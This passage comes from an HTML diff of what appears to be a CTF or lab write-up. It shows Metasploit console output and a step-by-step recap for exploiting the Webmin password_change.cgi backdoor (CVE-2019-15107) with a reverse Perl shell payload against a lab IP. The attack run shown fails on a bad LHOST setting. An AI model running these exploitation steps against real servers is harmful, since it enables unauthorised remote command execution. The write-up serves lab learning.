+</span></span><span class="line"><span class="cl"><span class="n">After</span> <span class="n">interacting</span> <span class="n">with</span> <span class="n">a</span> <span class="n">module</span> <span class="n">you</span> <span class="n">can</span> <span class="n">manually</span> <span class="n">set</span> <span class="n">a</span> <span class="n">TARGET</span> <span class="n">with</span> <span class="n">set</span> <span class="n">TARGET</span> <span class="s1">&#39;Automatic (Linux Dropper)&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">msf6</span> <span class="o">&gt;</span> <span class="mi">10</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">Unknown</span> <span class="n">command</span><span class="p">:</span> <span class="mf">10.</span> <span class="n">Run</span> <span class="n">the</span> <span class="n">help</span> <span class="n">command</span> <span class="k">for</span> <span class="n">more</span> <span class="n">details</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl"><span class="n">msf6</span> <span class="o">&gt;</span> <span class="mi">9</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">Unknown</span> <span class="n">command</span><span class="p">:</span> <span class="mf">9.</span> <span class="n">Run</span> <span class="n">the</span> <span class="n">help</span> <span class="n">command</span> <span class="k">for</span> <span class="n">more</span> <span class="n">details</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl"><span class="n">msf6</span> <span class="o">&gt;</span> <span class="n">use</span> <span class="mi">10</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Using</span> <span class="n">configured</span> <span class="n">payload</span> <span class="n">cmd</span><span class="o">/</span><span class="n">unix</span><span class="o">/</span><span class="n">reverse_perl</span>
+</span></span><span class="line"><span class="cl"><span class="n">msf6</span> <span class="n">exploit</span><span class="p">(</span><span class="n">linux</span><span class="o">/</span><span class="n">http</span><span class="o">/</span><span class="n">webmin_backdoor</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">info</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">       <span class="n">Name</span><span class="p">:</span> <span class="n">Webmin</span> <span class="n">password_change</span><span class="o">.</span><span class="n">cgi</span> <span class="n">Backdoor</span>
+</span></span><span class="line"><span class="cl">     <span class="n">Module</span><span class="p">:</span> <span class="n">exploit</span><span class="o">/</span><span class="n">linux</span><span class="o">/</span><span class="n">http</span><span class="o">/</span><span class="n">webmin_backdoor</span>
+</span></span><span class="line"><span class="cl">   <span class="n">Platform</span><span class="p">:</span> <span class="n">Unix</span><span class="p">,</span> <span class="n">Linux</span>
+</span></span><span class="line"><span class="cl">       <span class="n">Arch</span><span class="p">:</span> <span class="n">cmd</span><span class="p">,</span> <span class="n">x86</span><span class="p">,</span> <span class="n">x64</span>
+</span></span><span class="line"><span class="cl"> <span class="n">Privileged</span><span class="p">:</span> <span class="n">Yes</span>
+</span></span><span class="line"><span class="cl">    <span class="n">License</span><span class="p">:</span> <span class="n">Metasploit</span> <span class="n">Framework</span> <span class="n">License</span> <span class="p">(</span><span class="n">BSD</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">       <span class="n">Rank</span><span class="p">:</span> <span class="n">Excellent</span>
+</span></span><span class="line"><span class="cl">  <span class="n">Disclosed</span><span class="p">:</span> <span class="mi">2019</span><span class="o">-</span><span class="mi">08</span><span class="o">-</span><span class="mi">10</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">Provided</span> <span class="n">by</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">  <span class="n">AkkuS</span>
+</span></span><span class="line"><span class="cl">  <span class="n">wvu</span> <span class="o">&lt;</span><span class="n">wvu</span><span class="err">@</span><span class="n">metasploit</span><span class="o">.</span><span class="n">com</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">Module</span> <span class="n">side</span> <span class="n">effects</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl"> <span class="n">ioc</span><span class="o">-</span><span class="ow">in</span><span class="o">-</span><span class="n">logs</span>
+</span></span><span class="line"><span class="cl"> <span class="n">artifacts</span><span class="o">-</span><span class="n">on</span><span class="o">-</span><span class="n">disk</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">Module</span> <span class="n">stability</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl"> <span class="n">crash</span><span class="o">-</span><span class="n">safe</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">Module</span> <span class="n">reliability</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl"> <span class="n">repeatable</span><span class="o">-</span><span class="n">session</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">Available</span> <span class="n">targets</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">      <span class="n">Id</span>  <span class="n">Name</span>
+</span></span><span class="line"><span class="cl">      <span class="o">--</span>  <span class="o">----</span>
+</span></span><span class="line"><span class="cl">  <span class="o">=&gt;</span>  <span class="mi">0</span>   <span class="n">Automatic</span> <span class="p">(</span><span class="n">Unix</span> <span class="n">In</span><span class="o">-</span><span class="n">Memory</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">      <span class="mi">1</span>   <span class="n">Automatic</span> <span class="p">(</span><span class="n">Linux</span> <span class="n">Dropper</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">Check</span> <span class="n">supported</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">  <span class="n">Yes</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">Basic</span> <span class="n">options</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">  <span class="n">Name</span>       <span class="n">Current</span> <span class="n">Setting</span>  <span class="n">Required</span>  <span class="n">Description</span>
+</span></span><span class="line"><span class="cl">  <span class="o">----</span>       <span class="o">---------------</span>  <span class="o">--------</span>  <span class="o">-----------</span>
+</span></span><span class="line"><span class="cl">  <span class="n">Proxies</span>                     <span class="n">no</span>        <span class="n">A</span> <span class="n">proxy</span> <span class="n">chain</span> <span class="n">of</span> <span class="n">format</span> <span class="n">type</span><span class="p">:</span><span class="n">host</span><span class="p">:</span><span class="n">port</span><span class="p">[,</span><span class="n">type</span><span class="p">:</span><span class="n">host</span><span class="p">:</span><span class="n">port</span><span class="p">][</span><span class="o">...</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">  <span class="n">RHOSTS</span>                      <span class="n">yes</span>       <span class="n">The</span> <span class="n">target</span> <span class="n">host</span><span class="p">(</span><span class="n">s</span><span class="p">),</span> <span class="n">see</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">docs</span><span class="o">.</span><span class="n">metasploit</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">docs</span><span class="o">/</span><span class="n">using</span><span class="o">-</span><span class="n">metas</span>
+</span></span><span class="line"><span class="cl">                                        <span class="n">ploit</span><span class="o">/</span><span class="n">basics</span><span class="o">/</span><span class="n">using</span><span class="o">-</span><span class="n">metasploit</span><span class="o">.</span><span class="n">html</span>
+</span></span><span class="line"><span class="cl">  <span class="n">RPORT</span>      <span class="mi">10000</span>            <span class="n">yes</span>       <span class="n">The</span> <span class="n">target</span> <span class="n">port</span> <span class="p">(</span><span class="n">TCP</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="n">SSL</span>        <span class="bp">false</span>            <span class="n">no</span>        <span class="n">Negotiate</span> <span class="n">SSL</span><span class="o">/</span><span class="n">TLS</span> <span class="k">for</span> <span class="n">outgoing</span> <span class="n">connections</span>
+</span></span><span class="line"><span class="cl">  <span class="n">SSLCert</span>                     <span class="n">no</span>        <span class="ne">Path</span> <span class="n">to</span> <span class="n">a</span> <span class="n">custom</span> <span class="n">SSL</span> <span class="n">certificate</span> <span class="p">(</span><span class="n">default</span> <span class="n">is</span> <span class="n">randomly</span> <span class="n">generated</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="n">TARGETURI</span>  <span class="o">/</span>                <span class="n">yes</span>       <span class="n">Base</span> <span class="n">path</span> <span class="n">to</span> <span class="n">Webmin</span>
+</span></span><span class="line"><span class="cl">  <span class="n">URIPATH</span>                     <span class="n">no</span>        <span class="n">The</span> <span class="n">URI</span> <span class="n">to</span> <span class="n">use</span> <span class="k">for</span> <span class="n">this</span> <span class="n">exploit</span> <span class="p">(</span><span class="n">default</span> <span class="n">is</span> <span class="n">random</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="n">VHOST</span>                       <span class="n">no</span>        <span class="n">HTTP</span> <span class="n">server</span> <span class="n">virtual</span> <span class="n">host</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="n">When</span> <span class="n">CMDSTAGER</span><span class="p">::</span><span class="n">FLAVOR</span> <span class="n">is</span> <span class="n">one</span> <span class="n">of</span> <span class="n">auto</span><span class="p">,</span><span class="n">tftp</span><span class="p">,</span><span class="n">wget</span><span class="p">,</span><span class="n">curl</span><span class="p">,</span><span class="n">fetch</span><span class="p">,</span><span class="n">lwprequest</span><span class="p">,</span><span class="n">psh_invokewebrequest</span><span class="p">,</span><span class="n">ftp_http</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="n">Name</span>     <span class="n">Current</span> <span class="n">Setting</span>  <span class="n">Required</span>  <span class="n">Description</span>
+</span></span><span class="line"><span class="cl">  <span class="o">----</span>     <span class="o">---------------</span>  <span class="o">--------</span>  <span class="o">-----------</span>
+</span></span><span class="line"><span class="cl">  <span class="n">SRVHOST</span>  <span class="mf">0.0</span><span class="o">.</span><span class="mf">0.0</span>          <span class="n">yes</span>       <span class="n">The</span> <span class="n">local</span> <span class="n">host</span> <span class="ow">or</span> <span class="n">network</span> <span class="n">interface</span> <span class="n">to</span> <span class="n">listen</span> <span class="n">on</span><span class="o">.</span> <span class="n">This</span> <span class="n">must</span> <span class="n">be</span> <span class="n">an</span> <span class="n">addr</span>
+</span></span><span class="line"><span class="cl">                                      <span class="n">ess</span> <span class="n">on</span> <span class="n">the</span> <span class="n">local</span> <span class="n">machine</span> <span class="ow">or</span> <span class="mf">0.0</span><span class="o">.</span><span class="mf">0.0</span> <span class="n">to</span> <span class="n">listen</span> <span class="n">on</span> <span class="n">all</span> <span class="n">addresses</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl">  <span class="n">SRVPORT</span>  <span class="mi">8080</span>             <span class="n">yes</span>       <span class="n">The</span> <span class="n">local</span> <span class="n">port</span> <span class="n">to</span> <span class="n">listen</span> <span class="n">on</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">Payload</span> <span class="n">information</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">Description</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">  <span class="n">This</span> <span class="n">module</span> <span class="n">exploits</span> <span class="n">a</span> <span class="n">backdoor</span> <span class="ow">in</span> <span class="n">Webmin</span> <span class="n">versions</span> <span class="mf">1.890</span> <span class="n">through</span> <span class="mf">1.920</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl">  <span class="n">Only</span> <span class="n">the</span> <span class="n">SourceForge</span> <span class="n">downloads</span> <span class="n">were</span> <span class="n">backdoored</span><span class="p">,</span> <span class="n">but</span> <span class="n">they</span> <span class="n">are</span> <span class="n">listed</span> <span class="n">as</span>
+</span></span><span class="line"><span class="cl">  <span class="n">official</span> <span class="n">downloads</span> <span class="n">on</span> <span class="n">the</span> <span class="n">project</span><span class="s1">&#39;s site.</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="n">Unknown</span> <span class="n">attacker</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="n">inserted</span> <span class="n">Perl</span> <span class="n">qx</span> <span class="n">statements</span> <span class="n">into</span> <span class="n">the</span> <span class="n">build</span> <span class="n">server</span><span class="s1">&#39;s</span>
+</span></span><span class="line"><span class="cl">  <span class="n">source</span> <span class="n">code</span> <span class="n">on</span> <span class="n">two</span> <span class="n">separate</span> <span class="n">occasions</span><span class="p">:</span> <span class="n">once</span> <span class="ow">in</span> <span class="n">April</span> <span class="mi">2018</span><span class="p">,</span> <span class="n">introducing</span>
+</span></span><span class="line"><span class="cl">  <span class="n">the</span> <span class="n">backdoor</span> <span class="ow">in</span> <span class="n">the</span> <span class="mf">1.890</span> <span class="n">release</span><span class="p">,</span> <span class="ow">and</span> <span class="ow">in</span> <span class="n">July</span> <span class="mi">2018</span><span class="p">,</span> <span class="n">reintroducing</span> <span class="n">the</span>
+</span></span><span class="line"><span class="cl">  <span class="n">backdoor</span> <span class="ow">in</span> <span class="n">releases</span> <span class="mf">1.900</span> <span class="n">through</span> <span class="mf">1.920</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="n">Only</span> <span class="n">version</span> <span class="mf">1.890</span> <span class="n">is</span> <span class="n">exploitable</span> <span class="ow">in</span> <span class="n">the</span> <span class="n">default</span> <span class="n">install</span><span class="o">.</span> <span class="n">Later</span> <span class="n">affected</span>
+</span></span><span class="line"><span class="cl">  <span class="n">versions</span> <span class="n">require</span> <span class="n">the</span> <span class="n">expired</span> <span class="n">password</span> <span class="n">changing</span> <span class="n">feature</span> <span class="n">to</span> <span class="n">be</span> <span class="n">enabled</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">References</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">  <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">nvd</span><span class="o">.</span><span class="n">nist</span><span class="o">.</span><span class="n">gov</span><span class="o">/</span><span class="n">vuln</span><span class="o">/</span><span class="n">detail</span><span class="o">/</span><span class="n">CVE</span><span class="o">-</span><span class="mi">2019</span><span class="o">-</span><span class="mi">15107</span>
+</span></span><span class="line"><span class="cl">  <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">www</span><span class="o">.</span><span class="n">webmin</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">exploit</span><span class="o">.</span><span class="n">html</span>
+</span></span><span class="line"><span class="cl">  <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">pentest</span><span class="o">.</span><span class="n">com</span><span class="o">.</span><span class="n">tr</span><span class="o">/</span><span class="n">exploits</span><span class="o">/</span><span class="n">DEFCON</span><span class="o">-</span><span class="n">Webmin</span><span class="o">-</span><span class="mi">1920</span><span class="o">-</span><span class="n">Unauthenticated</span><span class="o">-</span><span class="n">Remote</span><span class="o">-</span><span class="n">Command</span><span class="o">-</span><span class="n">Execution</span><span class="o">.</span><span class="n">html</span>
+</span></span><span class="line"><span class="cl">  <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">blog</span><span class="o">.</span><span class="n">firosolutions</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">exploits</span><span class="o">/</span><span class="n">webmin</span><span class="o">/</span>
+</span></span><span class="line"><span class="cl">  <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">github</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">webmin</span><span class="o">/</span><span class="n">webmin</span><span class="o">/</span><span class="n">issues</span><span class="o">/</span><span class="mi">947</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">View</span> <span class="n">the</span> <span class="n">full</span> <span class="n">module</span> <span class="n">info</span> <span class="n">with</span> <span class="n">the</span> <span class="n">info</span> <span class="o">-</span><span class="n">d</span> <span class="n">command</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">msf6</span> <span class="n">exploit</span><span class="p">(</span><span class="n">linux</span><span class="o">/</span><span class="n">http</span><span class="o">/</span><span class="n">webmin_backdoor</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">set</span> <span class="n">RHOST</span> <span class="mf">178.16</span><span class="o">.</span><span class="mf">140.4</span>
+</span></span><span class="line"><span class="cl"><span class="n">RHOST</span> <span class="o">=&gt;</span> <span class="mf">178.16</span><span class="o">.</span><span class="mf">140.4</span>
+</span></span><span class="line"><span class="cl"><span class="n">msf6</span> <span class="n">exploit</span><span class="p">(</span><span class="n">linux</span><span class="o">/</span><span class="n">http</span><span class="o">/</span><span class="n">webmin_backdoor</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">set</span> <span class="n">SSL</span> <span class="bp">true</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">!</span><span class="p">]</span> <span class="n">Changing</span> <span class="n">the</span> <span class="n">SSL</span> <span class="n">option</span><span class="s1">&#39;s value may require changing RPORT!</span>
+</span></span><span class="line"><span class="cl"><span class="n">SSL</span> <span class="o">=&gt;</span> <span class="bp">true</span>
+</span></span><span class="line"><span class="cl"><span class="n">msf6</span> <span class="n">exploit</span><span class="p">(</span><span class="n">linux</span><span class="o">/</span><span class="n">http</span><span class="o">/</span><span class="n">webmin_backdoor</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">set</span> <span class="n">LHOST</span> <span class="n">tun0</span>
+</span></span><span class="line"><span class="cl"><span class="n">LHOST</span> <span class="o">=&gt;</span> <span class="n">tun0</span>
+</span></span><span class="line"><span class="cl"><span class="n">msf6</span> <span class="n">exploit</span><span class="p">(</span><span class="n">linux</span><span class="o">/</span><span class="n">http</span><span class="o">/</span><span class="n">webmin_backdoor</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">show</span> <span class="n">options</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">Module</span> <span class="n">options</span> <span class="p">(</span><span class="n">exploit</span><span class="o">/</span><span class="n">linux</span><span class="o">/</span><span class="n">http</span><span class="o">/</span><span class="n">webmin_backdoor</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   <span class="n">Name</span>       <span class="n">Current</span> <span class="n">Setting</span>  <span class="n">Required</span>  <span class="n">Description</span>
+</span></span><span class="line"><span class="cl">   <span class="o">----</span>       <span class="o">---------------</span>  <span class="o">--------</span>  <span class="o">-----------</span>
+</span></span><span class="line"><span class="cl">   <span class="n">Proxies</span>                     <span class="n">no</span>        <span class="n">A</span> <span class="n">proxy</span> <span class="n">chain</span> <span class="n">of</span> <span class="n">format</span> <span class="n">type</span><span class="p">:</span><span class="n">host</span><span class="p">:</span><span class="n">port</span><span class="p">[,</span><span class="n">type</span><span class="p">:</span><span class="n">host</span><span class="p">:</span><span class="n">port</span><span class="p">][</span><span class="o">...</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">   <span class="n">RHOSTS</span>     <span class="mf">178.16</span><span class="o">.</span><span class="mf">140.4</span>     <span class="n">yes</span>       <span class="n">The</span> <span class="n">target</span> <span class="n">host</span><span class="p">(</span><span class="n">s</span><span class="p">),</span> <span class="n">see</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">docs</span><span class="o">.</span><span class="n">metasploit</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">docs</span><span class="o">/</span><span class="n">using</span><span class="o">-</span><span class="n">meta</span>
+</span></span><span class="line"><span class="cl">                                         <span class="n">sploit</span><span class="o">/</span><span class="n">basics</span><span class="o">/</span><span class="n">using</span><span class="o">-</span><span class="n">metasploit</span><span class="o">.</span><span class="n">html</span>
+</span></span><span class="line"><span class="cl">   <span class="n">RPORT</span>      <span class="mi">10000</span>            <span class="n">yes</span>       <span class="n">The</span> <span class="n">target</span> <span class="n">port</span> <span class="p">(</span><span class="n">TCP</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">   <span class="n">SSL</span>        <span class="bp">true</span>             <span class="n">no</span>        <span class="n">Negotiate</span> <span class="n">SSL</span><span class="o">/</span><span class="n">TLS</span> <span class="k">for</span> <span class="n">outgoing</span> <span class="n">connections</span>
+</span></span><span class="line"><span class="cl">   <span class="n">SSLCert</span>                     <span class="n">no</span>        <span class="ne">Path</span> <span class="n">to</span> <span class="n">a</span> <span class="n">custom</span> <span class="n">SSL</span> <span class="n">certificate</span> <span class="p">(</span><span class="n">default</span> <span class="n">is</span> <span class="n">randomly</span> <span class="n">generated</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">   <span class="n">TARGETURI</span>  <span class="o">/</span>                <span class="n">yes</span>       <span class="n">Base</span> <span class="n">path</span> <span class="n">to</span> <span class="n">Webmin</span>
+</span></span><span class="line"><span class="cl">   <span class="n">URIPATH</span>                     <span class="n">no</span>        <span class="n">The</span> <span class="n">URI</span> <span class="n">to</span> <span class="n">use</span> <span class="k">for</span> <span class="n">this</span> <span class="n">exploit</span> <span class="p">(</span><span class="n">default</span> <span class="n">is</span> <span class="n">random</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">   <span class="n">VHOST</span>                       <span class="n">no</span>        <span class="n">HTTP</span> <span class="n">server</span> <span class="n">virtual</span> <span class="n">host</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   <span class="n">When</span> <span class="n">CMDSTAGER</span><span class="p">::</span><span class="n">FLAVOR</span> <span class="n">is</span> <span class="n">one</span> <span class="n">of</span> <span class="n">auto</span><span class="p">,</span><span class="n">tftp</span><span class="p">,</span><span class="n">wget</span><span class="p">,</span><span class="n">curl</span><span class="p">,</span><span class="n">fetch</span><span class="p">,</span><span class="n">lwprequest</span><span class="p">,</span><span class="n">psh_invokewebrequest</span><span class="p">,</span><span class="n">ftp_http</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   <span class="n">Name</span>     <span class="n">Current</span> <span class="n">Setting</span>  <span class="n">Required</span>  <span class="n">Description</span>
+</span></span><span class="line"><span class="cl">   <span class="o">----</span>     <span class="o">---------------</span>  <span class="o">--------</span>  <span class="o">-----------</span>
+</span></span><span class="line"><span class="cl">   <span class="n">SRVHOST</span>  <span class="mf">0.0</span><span class="o">.</span><span class="mf">0.0</span>          <span class="n">yes</span>       <span class="n">The</span> <span class="n">local</span> <span class="n">host</span> <span class="ow">or</span> <span class="n">network</span> <span class="n">interface</span> <span class="n">to</span> <span class="n">listen</span> <span class="n">on</span><span class="o">.</span> <span class="n">This</span> <span class="n">must</span> <span class="n">be</span> <span class="n">an</span> <span class="n">add</span>
+</span></span><span class="line"><span class="cl">                                       <span class="n">ress</span> <span class="n">on</span> <span class="n">the</span> <span class="n">local</span> <span class="n">machine</span> <span class="ow">or</span> <span class="mf">0.0</span><span class="o">.</span><span class="mf">0.0</span> <span class="n">to</span> <span class="n">listen</span> <span class="n">on</span> <span class="n">all</span> <span class="n">addresses</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl">   <span class="n">SRVPORT</span>  <span class="mi">8080</span>             <span class="n">yes</span>       <span class="n">The</span> <span class="n">local</span> <span class="n">port</span> <span class="n">to</span> <span class="n">listen</span> <span class="n">on</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">Payload</span> <span class="n">options</span> <span class="p">(</span><span class="n">cmd</span><span class="o">/</span><span class="n">unix</span><span class="o">/</span><span class="n">reverse_perl</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   <span class="n">Name</span>   <span class="n">Current</span> <span class="n">Setting</span>  <span class="n">Required</span>  <span class="n">Description</span>
+</span></span><span class="line"><span class="cl">   <span class="o">----</span>   <span class="o">---------------</span>  <span class="o">--------</span>  <span class="o">-----------</span>
+</span></span><span class="line"><span class="cl">   <span class="n">LHOST</span>  <span class="n">tun0</span>             <span class="n">yes</span>       <span class="n">The</span> <span class="n">listen</span> <span class="n">address</span> <span class="p">(</span><span class="n">an</span> <span class="n">interface</span> <span class="n">may</span> <span class="n">be</span> <span class="n">specified</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">   <span class="n">LPORT</span>  <span class="mi">4444</span>             <span class="n">yes</span>       <span class="n">The</span> <span class="n">listen</span> <span class="n">port</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">Exploit</span> <span class="n">target</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   <span class="n">Id</span>  <span class="n">Name</span>
+</span></span><span class="line"><span class="cl">   <span class="o">--</span>  <span class="o">----</span>
+</span></span><span class="line"><span class="cl">   <span class="mi">0</span>   <span class="n">Automatic</span> <span class="p">(</span><span class="n">Unix</span> <span class="n">In</span><span class="o">-</span><span class="n">Memory</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">View</span> <span class="n">the</span> <span class="n">full</span> <span class="n">module</span> <span class="n">info</span> <span class="n">with</span> <span class="n">the</span> <span class="n">info</span><span class="p">,</span> <span class="ow">or</span> <span class="n">info</span> <span class="o">-</span><span class="n">d</span> <span class="n">command</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">msf6</span> <span class="n">exploit</span><span class="p">(</span><span class="n">linux</span><span class="o">/</span><span class="n">http</span><span class="o">/</span><span class="n">webmin_backdoor</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">run</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">Msf</span><span class="p">::</span><span class="n">OptionValidateError</span> <span class="n">One</span> <span class="ow">or</span> <span class="n">more</span> <span class="n">options</span> <span class="n">failed</span> <span class="n">to</span> <span class="n">validate</span><span class="p">:</span> <span class="n">LHOST</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Exploit</span> <span class="n">completed</span><span class="p">,</span> <span class="n">but</span> <span class="n">no</span> <span class="n">session</span> <span class="n">was</span> <span class="n">created</span><span class="o">.</span><span class="n">i</span><span class="err">㉿</span><span class="n">kali</span><span class="p">)</span><span class="o">-</span><span class="p">[</span><span class="o">~/</span><span class="n">Downloads</span><span class="p">]</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="important">Important!!!
+</h3><p>use command to run <strong>msf6</strong> step by step</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="err">┌──</span><span class="p">(</span><span class="n">kal</span><span class="err">┌──</span><span class="p">(</span><span class="n">kali</span><span class="err">㉿</span><span class="n">kali</span><span class="p">)</span><span class="o">-</span><span class="p">[</span><span class="o">~/</span><span class="n">Downloads</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="err">└─</span><span class="o">$</span> <span class="n">msfconsole</span> 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">msf6</span> <span class="o">&gt;</span> <span class="n">search</span> <span class="n">webmin</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">msf6</span> <span class="o">&gt;</span> <span class="n">use</span> <span class="mi">10</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">msf6</span> <span class="n">exploit</span><span class="p">(</span><span class="n">linux</span><span class="o">/</span><span class="n">http</span><span class="o">/</span><span class="n">webmin_backdoor</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">set</span> <span class="n">RHOST</span> <span class="mf">178.16</span><span class="o">.</span><span class="mf">140.4</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">msf6</span> <span class="n">exploit</span><span class="p">(</span><span class="n">linux</span><span class="o">/</span><span class="n">http</span><span class="o">/</span><span class="n">webmin_backdoor</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">set</span> <span class="n">SSL</span> <span class="bp">true</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">msf6</span> <span class="n">exploit</span><span class="p">(</span><span class="n">linux</span><span class="o">/</span><span class="n">http</span><span class="o">/</span><span class="n">webmin_backdoor</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">set</span> <span class="n">LHOST</span> <span class="n">tun0</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">msf6</span> <span class="n">exploit</span><span class="p">(</span><span class="n">linux</span><span class="o">/</span><span class="n">http</span><span class="o">/</span><span class="n">webmin_backdoor</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">show</span> <span class="n">options</span>
+</span></span><span class="line"><span class="cl">
